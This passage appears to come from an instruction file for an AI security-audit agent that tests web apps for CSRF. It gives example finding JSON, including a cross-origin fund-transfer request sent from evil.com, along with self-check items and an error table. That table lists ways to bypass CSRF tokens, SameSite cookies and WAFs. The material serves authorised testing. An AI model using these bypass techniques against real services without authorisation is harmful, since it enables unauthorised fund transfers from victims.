  "evidence": "EVID_CSRF_ENDPOINT_IDENTITY: POST /api/transfer — performs fund transfer; EVID_CSRF_TOKEN_STATUS: No _token field in form, no VerifyCsrfToken middleware on route; EVID_CSRF_SAMESITE_STATUS: Set-Cookie: PHPSESSID=xxx; path=/ (no SameSite attribute); EVID_CSRF_CROSS_ORIGIN_RESPONSE: Cross-origin POST with Origin:http://evil.com returned HTTP 200 {status:success, balance:0}",
  "confidence": "confirmed",
  "impact": "Fund transfer — attacker can transfer victim funds via cross-site form",
  "prerequisite_conditions": { "auth_requirement": "authenticated", "exploitability_judgment": "directly_exploitable" },
  "severity": { "reachability": 2, "impact": 3, "complexity": 2, "score": 2.30, "cvss": 7.7, "level": "H" }
}
```

### ❌ BAD Output Example

```json
{
  "sink_id": "CSRF-001",
  "vuln_type": "CSRF",
  "final_verdict": "confirmed",
  "evidence": "No CSRF token found in the form",
  "severity": { "level": "H" }
}
// ❌ Missing token is necessary but not sufficient — must prove state change
// ❌ No cross-origin request proof, no state diff
// ❌ Missing SameSite cookie analysis
// ❌ severity missing scores and reasons
```


---

## Pre-Submission Self-Check (MUST execute)

After completing the exploit JSON, perform item-by-item self-check per `shared/auditor_self_check.md`:

1. Execute generic 8 items (G1-G8); proceed only after all are ✅
2. Execute the specialized checks below (S1-S3); submit only after all are ✅
3. If any item is ❌ → fix and re-check; MUST NOT skip

### Specialized Self-Check (CSRF Auditor Specific)
- [ ] S1: Token validation mechanism (missing/predictable/not bound to session) has been analyzed
- [ ] S2: SameSite cookie attribute has been confirmed via Set-Cookie response header
- [ ] S3: Specific business impact of state-changing operations has been quantified

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Anti-CSRF token present and validated | Attempt token reuse, token prediction, or subdomain bypass; if all fail → record `"status": "csrf_protected"` |
| SameSite cookie attribute blocks cross-origin request | Test with subdomain or same-site vector; if blocked → record `"csrf_mitigated": true` |
| Payload blocked by WAF/filter | Log filter type, switch to alternative form submission method; if all variants fail → record `"waf_blocked": true` |
